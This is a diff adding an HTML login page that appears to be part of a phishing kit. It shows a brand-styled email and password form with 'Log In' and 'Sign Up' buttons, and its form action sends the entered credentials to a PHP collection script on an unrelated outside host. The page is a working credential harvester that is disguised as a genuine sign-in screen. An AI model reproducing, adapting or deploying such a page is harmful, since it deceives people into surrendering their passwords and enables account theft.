@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="../../../../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<!-- Optional theme -->
+<link rel="stylesheet" href="../../../../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+
+<!-- Latest compiled and minified JavaScript -->
+<script src="../../../../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+	<style type="text/css">
+
+
+
+	</style>
+	
+	
+	
+</head>
+<body>
+
+<form method="post" name="form" action="http://altechcare.com/js/new/866a815/check.php?check;7428bd39a119f9fbd73b276b0675f590">
+<div class="col-md-4 col-sm-10 col-md-offset-4 centered" style="margin-top:13em;">
+<div class="form-group col-xs-offset-4 col-md-offset-4 ">
+<img src="img/logo.svg" style="margin-bottom:1em;">
+
+</div>
+  <div class="form-group">
+    <input type="email" class="form-control input-lg" name="email" id="email" aria-describedby="emailHelp" placeholder="Email" required>
+  </div>
+  <div class="form-group">
+    <input type="password" name="password" class="form-control input-lg" id="exampleInputPassword1" placeholder="Password" required>
+  </div>
+
+  <button type="Login" style="width:100%;background-color:#005ea6 !important;background:#005ea6 !important;" class="btn btn-primary btn-lg">Log In</button>
+  <div class="form-group col-xs-offset-4 col-md-offset-4" style="margin-top:2em;">
+  <p><a href="index.html#">Having trouble logging in?</a></p>
+  </div>
+  <div class="form-group">
+  <hr>
+  </div>
+    <button type="submit" style="width:100%;background:#E1E7EB; !important;color:black;border:none;font-size:1.2em;" class="btn btn-primary btn-lg">Sign Up</button>
+
+
+</form>
+
+</body>
+
+
+</html>
